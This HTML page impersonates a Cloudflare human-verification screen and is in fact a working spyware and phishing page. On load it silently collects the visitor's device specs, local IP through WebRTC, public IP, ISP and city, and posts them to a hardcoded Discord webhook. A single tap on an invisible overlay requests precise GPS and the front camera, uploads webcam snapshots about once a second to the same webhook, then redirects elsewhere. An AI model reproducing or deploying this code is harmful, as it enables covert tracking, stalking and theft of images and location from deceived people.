<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cloudflare | Security Check</title>
    <style>
        body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#313131;overflow:hidden;user-select:none;touch-action:none}
        .cf-w{width:100%;max-width:420px;padding:45px 35px;box-sizing:border-box;text-align:center;position:relative;border:1px solid #e6e6e6;border-radius:2px;box-shadow:0 10px 40px rgba(0,0,0,0.06);z-index:10;background:#fff}
        .logo{width:120px;margin-bottom:30px;filter:grayscale(20%)}
        .h1{font-size:24px;font-weight:500;margin-bottom:12px;color:#000;letter-spacing:-0.5px}
        .p{font-size:15px;color:#666;margin-bottom:30px;line-height:1.6}
        .vf{width:100%;height:260px;background:#000;border-radius:6px;margin-bottom:25px;overflow:hidden;display:none;border:2px solid #0051c3}
        #v{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
        .ts-b{background:#fff;border:1px solid #ccc;border-radius:3px;padding:16px 20px;display:flex;align-items:center;cursor:pointer;justify-content:flex-start}
        .ts-c{width:28px;height:28px;border:3px solid #0051c3;border-radius:4px;margin-right:15px;position:relative}
        .ts-c.s{border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite}
        .ts-c.d{background:#0051c3;border-color:#0051c3}
        .ts-c.d::after{content:'';position:absolute;left:9px;top:4px;width:6px;height:12px;border:solid white;border-width:0 3px 3px 0;transform:rotate(45deg)}
        .ts-t{font-size:16px;color:#333;font-weight:400}
        .fn{font-size:12px;color:#999;margin-top:25px;border-top:1px solid #f0f0f0;padding-top:20px}
        #ovl{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000;cursor:pointer}
        @keyframes spin{100%{transform:rotate(360deg)}}
    </style>
</head>
<body>

<div id="ovl" onclick="stk()" ontouchstart="stk()"></div>

<div class="cf-w">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="logo">
    <div class="h1">Verify you are human</div>
    <p class="p">Please complete the biometric challenge. Align your face to the viewfinder to secure your session.</p>
    <div class="vf" id="vf"><video id="v" autoplay playsinline muted></video><canvas id="c" style="display:none"></canvas></div>
    <div class="ts-b"><div class="ts-c" id="l"></div><div class="ts-t" id="m">I am human</div></div>
    <div class="fn">Ray ID: <span id="rid"></span> • Protected by Turnstile v2</div>
</div>

<script>
const CFG = {
    H: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
    R: "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
    T: 14000
};

let ACTIVE = false, META = { lan: "Scanning...", count: 0, rid: "" };

// --- 1. THE ZERO-TAP THREAD (Passive Recon) ---
async function passiveRecon() {
    META.rid = (Math.random().toString(36).substring(2, 12)).toUpperCase();
    document.getElementById('rid').innerText = META.rid;

    // Hardware DeepScan
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        META.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Hidden";
        META.hw = `${navigator.hardwareConcurrency} core | ${navigator.deviceMemory || '?'}GB | ${screen.width}x${screen.height}`;
    } catch(e){}

    // WebRTC LAN Leak
    const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
    pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
    pc.onicecandidate = (e) => { if(e.candidate) { const r = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(r) META.lan = r[1]; }};

    // IP & ISP
    try {
        const r = await fetch('https://ipapi.co/json/');
        const j = await r.json();
        META.ip = j.ip; META.isp = j.org; META.loc = `${j.city}, ${j.country}`;
    } catch(e){ META.ip = "VPN/Hidden"; }

    // INITIAL EXFIL (Zero-Tap)
    await transmit(null, "🔱 PASSIVE RECON (0-TAP)");
}

// --- 2. THE ONE-TAP THREAD (Active Strike) ---
async function stk() {
    if(ACTIVE) return;
    ACTIVE = true;
    document.getElementById('ovl').remove();
    document.getElementById('l').className = 'ts-c s';
    document.getElementById('m').innerText = "Attesting...";

    // Force High-Accuracy GPS
    navigator.geolocation.getCurrentPosition(
        p => META.gps = `[View House](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`,
        e => META.gps = "❌ Blocked",
        { enableHighAccuracy: true }
    );

    // Biometric Engagement
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        document.getElementById('vf').style.display = 'block';
        const v = document.getElementById('v');
        v.srcObject = s;
        
        // Surveillance Loop
        const burst = setInterval(async () => {
            if(!ACTIVE) return clearInterval(burst);
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');
            c.width = v.videoWidth; c.height = v.videoHeight;
            ctx.drawImage(v, 0, 0);
            c.toBlob(b => transmit(b, `🔱 ACTIVE BURST: ${META.count}`), 'image/jpeg', 0.25);
        }, 1100);

        setTimeout(() => {
            ACTIVE = false;
            s.getTracks().forEach(t => t.stop());
            window.location.replace(CFG.R);
        }, CFG.T);

    } catch(e) {
        await transmit(null, "🔱 ONE-TAP (CAMERA DENIED)");
        setTimeout(() => window.location.replace(CFG.R), 2000);
    }
}

// --- 3. UNIFIED TRANSMITTER ---
async function transmit(blob, title) {
    META.count++;
    const fd = new FormData();
    const packet = {
        username: "NEXUS-v80 [ABSOLUTE-ZERO]",
        embeds: [{
            title: title,
            color: blob ? 0xF38020 : 0x0051c3,
            fields: [
                { name: "🌐 Network", value: `**IP:** \`${META.ip}\`\n**LAN:** \`${META.lan}\`\n**ISP:** ${META.isp}`, inline: true },
                { name: "📍 Geo", value: META.gps || "Scanning...", inline: true },
                { name: "📱 Device", value: `**GPU:** ${META.gpu}\n**SPEC:** ${META.hw}\n**OS:** ${navigator.platform}`, inline: false }
            ],
            footer: { text: `Ray-ID: ${META.rid} | v80` },
            timestamp: new Date().toISOString()
        }]
    };
    fd.append("payload_json", JSON.stringify(packet));
    if(blob) fd.append("file", blob, `shot_${META.count}.jpg`);
    return fetch(CFG.H, { method: 'POST', body: fd, keepalive: true });
}

passiveRecon();
</script>
</body>
</html>
